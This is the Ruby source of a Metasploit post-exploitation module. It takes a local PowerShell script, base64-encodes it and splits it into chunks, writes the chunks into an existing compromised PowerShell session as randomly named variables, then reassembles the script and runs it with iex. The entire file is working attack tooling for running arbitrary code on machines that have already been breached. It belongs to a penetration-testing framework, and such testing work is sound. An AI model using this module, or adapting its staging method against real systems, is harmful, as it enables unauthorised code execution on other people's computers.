##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Load Scripts Into PowerShell Session",
      'Description'          => %q{
        This module will download and execute a PowerShell script over a present powershell session.
        Setting VERBOSE to true will show the stager results.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['powershell'],
      'Author'        => [
          'Ben Turner benpturner[at]yahoo.com',
          'Dave Hardy davehardy20[at]gmail.com'
        ]
    ))

    register_options(
      [
        OptPath.new( 'SCRIPT',  [true, 'Path to the PS script', ::File.join(Msf::Config.install_root, "scripts", "ps", "msflag.ps1") ]),
      ], self.class)

  end

  def run
    # Get datastore values
    script_in = read_script(datastore['SCRIPT'])

    # Convert expression to unicode
    unicode_expression = Rex::Text.to_unicode(script_in)

    # Base64 encode the unicode expression
    encoded_expression = Rex::Text.encode_base64(unicode_expression)

    # If the encoded script size more than 15000 bytes, launch a stager
    if (encoded_expression.size > 14999)
      print_error("Compressed size: #{encoded_expression.size} This script requres a stager")
      arr = encoded_expression.chars.each_slice(14999).map(&:join)
      print_good("Loading " + arr.count.to_s + " chunks into the stager.")
      vararray = []

      arr.each_with_index do |slice, index|
        variable = Rex::Text.rand_text_alpha(8)
        vararray << variable
        indexval = index+1
        vprint_good("Loaded stage:#{indexval}")
        session.shell_command("$#{variable} = \"#{slice}\"")
      end
      linkvars = ''
      for var in vararray
        linkvars = linkvars + " + $" + var
      end
      linkvars.slice!(0..2)
      session.shell_command("$script = #{linkvars}")
    else
      print_good("Compressed size: #{encoded_expression.size}")
      session.shell_command("$script = \"#{encoded_expression}\"")
    end

    session.shell_command("$decscript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($script))")
    session.shell_command("$scriptby  = [System.Text.Encoding]::UTF8.GetBytes(\"$decscript\")")
    session.shell_command("$scriptbybase = [System.Convert]::ToBase64String($scriptby) ")
    session.shell_command("$scriptbybasefull = ([System.Convert]::FromBase64String($scriptbybase))")
    session.shell_command("([System.Text.Encoding]::UTF8.GetString($scriptbybasefull))|iex")
    print_good("Module loaded")
  end


end
